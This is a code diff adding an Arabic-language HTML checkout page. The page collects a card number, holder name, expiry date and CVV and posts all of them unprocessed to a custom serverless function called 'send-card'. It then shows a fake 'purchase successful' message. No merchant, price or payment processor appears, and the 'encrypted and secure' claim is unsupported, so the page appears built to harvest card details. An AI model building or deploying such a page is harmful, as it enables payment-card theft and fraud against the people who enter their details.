@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال معلومات البطاقة البنكية</title>
+    <style>
+        :root {
+            --bg: #0f0f1a;
+            --gold: #d4a853;
+            --text: #e0e0e0;
+            --text-light: #b0b0b0;
+            --input-bg: #1e1e32;
+            --input-border: #2a2a45;
+            --input-focus: #3a3a60;
+            --danger: #e74c3c;
+            --success: #2ecc71;
+            --visa-color: #1a73e8;
+            --mastercard-color: #eb001b;
+            --amex-color: #2e77bb;
+            --discover-color: #f27712;
+            --radius: 16px;
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', 'Cairo', sans-serif;
+            background: var(--bg);
+            background-image:
+                radial-gradient(ellipse at 20% 20%, rgba(212, 168, 83, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 80%, rgba(15, 52, 96, 0.2) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 50%, rgba(30, 30, 50, 0.8) 0%, transparent 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+            position: relative;
+        }
+
+        body::before,
+        body::after {
+            content: '';
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        body::before {
+            top: -200px;
+            left: -200px;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(212, 168, 83, 0.04) 0%, transparent 70%);
+            animation: floatGlow 8s ease-in-out infinite;
+        }
+        body::after {
+            bottom: -150px;
+            right: -150px;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(26, 115, 232, 0.05) 0%, transparent 70%);
+            animation: floatGlow 10s ease-in-out infinite reverse;
+        }
+        @keyframes floatGlow {
+            0%,
+            100% {
+                transform: translate(0, 0);
+            }
+            25% {
+                transform: translate(30px, -40px);
+            }
+            50% {
+                transform: translate(-20px, -20px);
+            }
+            75% {
+                transform: translate(-30px, 30px);
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 520px;
+            display: flex;
+            flex-direction: column;
+            gap: 28px;
+        }
+
+        /* ============ النموذج ============ */
+        .form-container {
+            background: rgba(22, 22, 40, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 30px 26px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            transition: box-shadow var(--transition);
+        }
+        .form-container:hover {
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
+        }
+        .form-subtitle {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: -12px;
+            margin-bottom: 6px;
+        }
+        .form-subtitle .secure-icon {
+            display: inline-block;
+            color: var(--success);
+            margin-left: 4px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .input-group label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #bbb;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 16px;
+            padding-left: 50px;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-family: 'Courier New', 'Consolas', monospace;
+            letter-spacing: 1px;
+            transition: all var(--transition);
+            outline: none;
+            direction: ltr;
+            text-align: left;
+        }
+        .input-wrapper input::placeholder {
+            color: #555;
+            letter-spacing: 1px;
+        }
+        .input-wrapper input:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 20px rgba(212, 168, 83, 0.2), 0 0 0 4px rgba(212, 168, 83, 0.05);
+            background: #222240;
+        }
+        .input-wrapper input.error {
+            border-color: var(--danger);
+            box-shadow: 0 0 15px rgba(231, 76, 60, 0.2);
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-6px);
+            }
+            50% {
+                transform: translateX(6px);
+            }
+            75% {
+                transform: translateX(-4px);
+            }
+        }
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            font-size: 18px;
+            color: #666;
+            pointer-events: none;
+            transition: color var(--transition);
+            z-index: 2;
+        }
+        .input-wrapper:has(input:focus) .input-icon {
+            color: var(--gold);
+        }
+
+        .card-type-badge {
+            position: absolute;
+            right: 12px;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            color: #fff;
+            letter-spacing: 0.5px;
+            opacity: 0;
+            transform: translateY(5px);
+            transition: all var(--transition);
+            pointer-events: none;
+            z-index: 2;
+        }
+        .card-type-badge.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .card-type-badge.visa-badge {
+            background: var(--visa-color);
+        }
+        .card-type-badge.mastercard-badge {
+            background: var(--mastercard-color);
+        }
+        .card-type-badge.amex-badge {
+            background: var(--amex-color);
+        }
+        .card-type-badge.discover-badge {
+            background: var(--discover-color);
+        }
+
+        .row {
+            display: flex;
+            gap: 14px;
+        }
+        .row .input-group {
+            flex: 1;
+        }
+        .row .input-wrapper input {
+            padding-left: 16px;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #d4a853 0%, #c4913a 50%, #b07d2e 100%);
+            border: none;
+            border-radius: 12px;
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: all var(--transition);
+            box-shadow: 0 8px 25px rgba(212, 168, 83, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 35px rgba(212, 168, 83, 0.45);
+            background: linear-gradient(135deg, #e0b960 0%, #d4a040 50%, #c08830 100%);
+        }
+        .submit-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 4px 15px rgba(212, 168, 83, 0.3);
+        }
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.25) 0%, transparent 60%);
+            opacity: 0;
+            transition: opacity 0.4s;
+            pointer-events: none;
+        }
+        .submit-btn:hover::after {
+            opacity: 1;
+        }
+
+        .error-message {
+            display: none;
+            text-align: center;
+            padding: 16px;
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+            border-radius: 12px;
+            color: var(--danger);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            animation: fadeInUp 0.5s ease;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* نقاط التقدم */
+        .dots-decoration {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin-bottom: -8px;
+        }
+        .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #444;
+            transition: all var(--transition);
+        }
+        .dot.filled {
+            background: var(--gold);
+            box-shadow: 0 0 8px rgba(212, 168, 83, 0.6);
+        }
+
+        /* ============ النافذة المنبثقة ============ */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-dialog {
+            background: linear-gradient(145deg, #1e1e32 0%, #16213e 100%);
+            border: 1px solid rgba(212, 168, 83, 0.3);
+            border-radius: 24px;
+            padding: 40px 30px 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 30px rgba(212, 168, 83, 0.2);
+            transform: scale(0.8) translateY(30px);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+        }
+        .modal-overlay.active .modal-dialog {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: successPop 0.6s ease forwards;
+        }
+        @keyframes successPop {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.3);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .modal-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        .modal-message {
+            font-size: 16px;
+            color: #ccc;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .modal-close-btn {
+            background: linear-gradient(135deg, #d4a853 0%, #b07d2e 100%);
+            border: none;
+            border-radius: 30px;
+            padding: 12px 35px;
+            color: #1a1a1a;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(212, 168, 83, 0.3);
+        }
+        .modal-close-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(212, 168, 83, 0.5);
+        }
+
+        /* جسيمات متحركة في الخلفية */
+        .modal-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            border-radius: 24px;
+        }
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: var(--gold);
+            border-radius: 50%;
+            opacity: 0;
+            animation: floatUp 2s ease-in infinite;
+        }
+        @keyframes floatUp {
+            0% {
+                transform: translateY(0) scale(0);
+                opacity: 0;
+            }
+            20% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(-150px) scale(1.5);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 22px 16px;
+                border-radius: 16px;
+                gap: 14px;
+            }
+            .row {
+                gap: 10px;
+            }
+            .input-wrapper input {
+                padding: 12px 12px;
+                font-size: 14px;
+            }
+            .submit-btn {
+                padding: 13px;
+                font-size: 14px;
+            }
+            .modal-dialog {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- نموذج الإدخال -->
+        <div class="form-container" id="formContainer">
+            <div class="form-title">💳 معلومات البطاقة</div>
+            <div class="form-subtitle">
+                <span class="secure-icon">🔒</span> بياناتك مشفرة وآمنة تمامًا
+            </div>
+
+            <!-- رقم البطاقة -->
+            <div class="input-group">
+                <label for="cardNumber">رقم البطاقة</label>
+                <div class="input-wrapper">
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
+                    <span class="input-icon">💳</span>
+                    <span class="card-type-badge" id="cardTypeBadge"></span>
+                </div>
+            </div>
+
+            <!-- حامل البطاقة -->
+            <div class="input-group">
+                <label for="cardHolder">اسم حامل البطاقة</label>
+                <div class="input-wrapper">
+                    <input type="text" id="cardHolder" placeholder="الاسم الكامل كما هو مدون على البطاقة" autocomplete="cc-name">
+                    <span class="input-icon">👤</span>
+                </div>
+            </div>
+
+            <!-- تاريخ الانتهاء و CVV -->
+            <div class="row">
+                <div class="input-group">
+                    <label for="expiryDate">انتهاء الصلاحية</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="cvv">رمز الأمان CVV</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="cvv" placeholder="***" maxlength="4" autocomplete="cc-csc">
+                    </div>
+                </div>
+            </div>
+
+            <!-- زر الإرسال -->
+            <button class="submit-btn" id="submitBtn">✅ إتمام الدفع</button>
+
+            <!-- رسالة خطأ -->
+            <div class="error-message" id="errorMessage"></div>
+        </div>
+
+        <!-- نقاط التقدم -->
+        <div class="dots-decoration">
+            <span class="dot filled" id="dot1"></span>
+            <span class="dot" id="dot2"></span>
+            <span class="dot" id="dot3"></span>
+            <span class="dot" id="dot4"></span>
+        </div>
+    </div>
+
+    <!-- النافذة المنبثقة للنجاح -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-dialog">
+            <div class="modal-particles" id="modalParticles"></div>
+            <div class="modal-icon">✅</div>
+            <div class="modal-title">تم الشراء بنجاح</div>
+            <div class="modal-message">شكراً لتعاملك معنا. سيتم تحويلك قريباً.</div>
+            <button class="modal-close-btn" id="closeModalBtn">حسناً</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // عناصر الإدخال
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardHolderInput = document.getElementById('cardHolder');
+            const expiryDateInput = document.getElementById('expiryDate');
+            const cvvInput = document.getElementById('cvv');
+            const cardTypeBadge = document.getElementById('cardTypeBadge');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const dots = [
+                document.getElementById('dot1'),
+                document.getElementById('dot2'),
+                document.getElementById('dot3'),
+                document.getElementById('dot4')
+            ];
+
+            // النافذة المنبثقة
+            const successModal = document.getElementById('successModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const modalParticles = document.getElementById('modalParticles');
+
+            let detectedCardType = null;
+
+            // أنماط أنواع البطاقات
+            const cardPatterns = [
+                {
+                    name: 'visa',
+                    label: 'Visa',
+                    pattern: /^4[0-9]{0,15}$/,
+                    validLengths: [13, 16],
+                    cvvLength: 3,
+                    badgeClass: 'visa-badge'
+                },
+                {
+                    name: 'mastercard',
+                    label: 'Mastercard',
+                    pattern: /^(5[1-5][0-9]{0,14}|2(2[2-9][0-9]{0,12}|[3-6][0-9]{0,13}|7[0-1][0-9]{0,12}|720[0-9]{0,11}))$/,
+                    validLengths: [16],
+                    cvvLength: 3,
+                    badgeClass: 'mastercard-badge'
+                },
+                {
+                    name: 'amex',
+                    label: 'American Express',
+                    pattern: /^3[47][0-9]{0,13}$/,
+                    validLengths: [15],
+                    cvvLength: 4,
+                    badgeClass: 'amex-badge'
+                },
+                {
+                    name: 'discover',
+                    label: 'Discover',
+                    pattern: /^(6011[0-9]{0,12}|65[0-9]{0,14}|64[4-9][0-9]{0,13}|622(1[2-9][0-9]{0,10}|[2-8][0-9]{0,11}|9[0-1][0-9]{0,10}|92[0-5][0-9]{0,9}))$/,
+                    validLengths: [16, 19],
+                    cvvLength: 3,
+                    badgeClass: 'discover-badge'
+                }
+            ];
+
+            // دالة الكشف عن نوع البطاقة
+            function detectCardType(cardNumber) {
+                const cleaned = cardNumber.replace(/\s/g, '');
+                if (cleaned.length === 0) return null;
+                for (const pattern of cardPatterns) {
+                    if (pattern.pattern.test(cleaned)) {
+                        return pattern;
+                    }
+                }
+                return null;
+            }
+
+            // دالة تنسيق رقم البطاقة
+            function formatCardNumber(value) {
+                const cleaned = value.replace(/\D/g, '');
+                if (detectedCardType && detectedCardType.name === 'amex' && cleaned.length > 4) {
+                    const parts = [];
+                    parts.push(cleaned.substring(0, 4));
+                    if (cleaned.length > 4) parts.push(cleaned.substring(4, 10));
+                    if (cleaned.length > 10) parts.push(cleaned.substring(10, 15));
+                    return parts.join(' ').trim();
+                }
+                const groups = cleaned.match(/.{1,4}/g);
+                return groups ? groups.join(' ') : '';
+            }
+
+            // تحديث شارة نوع البطاقة
+            function updateCardTypeBadge(cardType) {
+                if (cardType) {
+                    cardTypeBadge.textContent = cardType.label;
+                    cardTypeBadge.className = 'card-type-badge visible ' + cardType.badgeClass;
+                } else {
+                    cardTypeBadge.textContent = '';
+                    cardTypeBadge.className = 'card-type-badge';
+                }
+                detectedCardType = cardType;
+            }
+
+            // تحديث نقاط التقدم
+            function updateDots() {
+                const cardFilled = cardNumberInput.value.replace(/\s/g, '').length >= 13;
+                const holderFilled = cardHolderInput.value.trim().length >= 3;
+                const expiryFilled = expiryDateInput.value.replace(/\D/g, '').length === 4;
+                const cvvFilled = cvvInput.value.replace(/\D/g, '').length >= 3;
+
+                if (cardFilled) dots[0].classList.add('filled');
+                else dots[0].classList.remove('filled');
+                if (holderFilled) dots[1].classList.add('filled');
+                else dots[1].classList.remove('filled');
+                if (expiryFilled) dots[2].classList.add('filled');
+                else dots[2].classList.remove('filled');
+                if (cvvFilled) dots[3].classList.add('filled');
+                else dots[3].classList.remove('filled');
+            }
+
+            // التحقق من صحة البيانات
+            function validateAll() {
+                let isValid = true;
+                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+                const expiryRaw = expiryDateInput.value.replace(/\D/g, '');
+                const cvvRaw = cvvInput.value.replace(/\D/g, '');
+                const holderName = cardHolderInput.value.trim();
+
+                [cardNumberInput, cardHolderInput, expiryDateInput, cvvInput].forEach(el => el.classList.remove('error'));
+
+                if (!detectedCardType || !detectedCardType.validLengths.includes(cardNumber.length)) {
+                    cardNumberInput.classList.add('error');
+                    isValid = false;
+                }
+
+                if (holderName.length < 3) {
+                    cardHolderInput.classList.add('error');
+                    isValid = false;
+                }
+
+                if (expiryRaw.length === 4) {
+                    const month = parseInt(expiryRaw.substring(0, 2));
+                    const year = parseInt('20' + expiryRaw.substring(2, 4));
+                    const now = new Date();
+                    const currentMonth = now.getMonth() + 1;
+                    const currentYear = now.getFullYear();
+                    if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+                        expiryDateInput.classList.add('error');
+                        isValid = false;
+                    }
+                } else {
+                    expiryDateInput.classList.add('error');
+                    isValid = false;
+                }
+
+                const expectedCvvLength = detectedCardType ? detectedCardType.cvvLength : 3;
+                if (cvvRaw.length !== expectedCvvLength) {
+                    cvvInput.classList.add('error');
+                    isValid = false;
+                }
+
+                return isValid;
+            }
+
+            // دالة الإرسال إلى الدالة الوسيطة (Netlify Function)
+            async function sendCardData(cardData) {
+                const response = await fetch('/.netlify/functions/send-card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cardData)
+                });
+                if (!response.ok) {
+                    const errData = await response.json().catch(() => ({}));
+                    throw new Error(errData.error || 'فشل إرسال البيانات');
+                }
+                return response.json();
+            }
+
+            // فتح النافذة المنبثقة
+            function openSuccessModal() {
+                successModal.classList.add('active');
+                generateParticles();
+                document.body.style.overflow = 'hidden';
+            }
+
+            // إغلاق النافذة المنبثقة
+            function closeSuccessModal() {
+                successModal.classList.remove('active');
+                document.body.style.overflow = '';
+                clearParticles();
+            }
+
+            // إنشاء جسيمات متحركة داخل النافذة
+            function generateParticles() {
+                clearParticles();
+                for (let i = 0; i < 20; i++) {
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.bottom = '0';
+                    particle.style.animationDelay = Math.random() * 2 + 's';
+                    particle.style.animationDuration = (Math.random() * 2 + 1.5) + 's';
+                    modalParticles.appendChild(particle);
+                }
+            }
+
+            function clearParticles() {
+                while (modalParticles.firstChild) {
+                    modalParticles.removeChild(modalParticles.firstChild);
+                }
+            }
+
+            // أحداث الإدخال
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = this.value;
+                const cardType = detectCardType(value);
+                updateCardTypeBadge(cardType);
+                const formatted = formatCardNumber(value);
+                this.value = formatted;
+                if (cardType) {
+                    this.maxLength = cardType.name === 'amex' ? 17 : 19;
+                } else {
+                    this.maxLength = 19;
+                }
+                updateDots();
+            });
+
+            cardNumberInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.endsWith(' ')) {
+                    this.value = this.value.slice(0, -1);
+                }
+            });
+
+            cardHolderInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^a-zA-Z\u0600-\u06FF\s]/g, '');
+                updateDots();
+            });
+
+            expiryDateInput.addEventListener('input', function() {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 4) value = value.substring(0, 4);
+                if (value.length >= 3) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                this.value = value;
+                updateDots();
+            });
+
+            cvvInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (detectedCardType) {
+                    this.maxLength = detectedCardType.cvvLength;
+                } else {
+                    this.maxLength = 4;
+                }
+                updateDots();
+            });
+
+            // منع لصق نصوص غير رقمية
+            [cardNumberInput, expiryDateInput, cvvInput].forEach(input => {
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                    const cleaned = pasted.replace(/\D/g, '');
+                    if (this === cardNumberInput) {
+                        const cardType = detectCardType(cleaned);
+                        updateCardTypeBadge(cardType);
+                        this.value = formatCardNumber(cleaned);
+                    } else if (this === expiryDateInput) {
+                        let val = cleaned.substring(0, 4);
+                        if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2, 4);
+                        this.value = val;
+                    } else {
+                        this.value = cleaned;
+                    }
+                    updateDots();
+                });
+            });
+
+            // زر الإرسال
+            submitBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                errorMessage.style.display = 'none';
+
+                if (!validateAll()) {
+                    const firstError = document.querySelector('input.error');
+                    if (firstError) firstError.focus();
+                    return;
+                }
+
+                const cardData = {
+                    number: cardNumberInput.value.replace(/\s/g, ''),
+                    holder: cardHolderInput.value.trim(),
+                    expiry: expiryDateInput.value,
+                    cvv: cvvInput.value,
+                    type: detectedCardType ? detectedCardType.label : 'غير معروف'
+                };
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = '⏳ جاري الإرسال...';
+                submitBtn.style.opacity = '0.7';
+                submitBtn.style.pointerEvents = 'none';
+
+                try {
+                    await sendCardData(cardData);
+                    openSuccessModal();
+                    // إعادة تعيين الحقول
+                    cardNumberInput.value = '';
+                    cardHolderInput.value = '';
+                    expiryDateInput.value = '';
+                    cvvInput.value = '';
+                    updateCardTypeBadge(null);
+                    updateDots();
+                } catch (error) {
+                    errorMessage.textContent = '❌ فشل إرسال البيانات. تأكد من الاتصال.';
+                    errorMessage.style.display = 'block';
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = '✅ إتمام الدفع';
+                    submitBtn.style.opacity = '1';
+                    submitBtn.style.pointerEvents = 'auto';
+                }
+            });
+
+            // أحداث النافذة المنبثقة
+            closeModalBtn.addEventListener('click', closeSuccessModal);
+            successModal.addEventListener('click', function(e) {
+                if (e.target === successModal) {
+                    closeSuccessModal();
+                }
+            });
+
+            // إغلاق النافذة بمفتاح Escape
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && successModal.classList.contains('active')) {
+                    closeSuccessModal();
+                }
+            });
+
+            // إعادة تعيين الأخطاء عند الكتابة
+            [cardNumberInput, cardHolderInput, expiryDateInput, cvvInput].forEach(input => {
+                input.addEventListener('input', function() {
+                    if (this.classList.contains('error')) {
+                        this.classList.remove('error');
+                    }
+                });
+            });
+
+            // تهيئة
+            updateDots();
+        })();
+    </script>
+</body>
+</html>
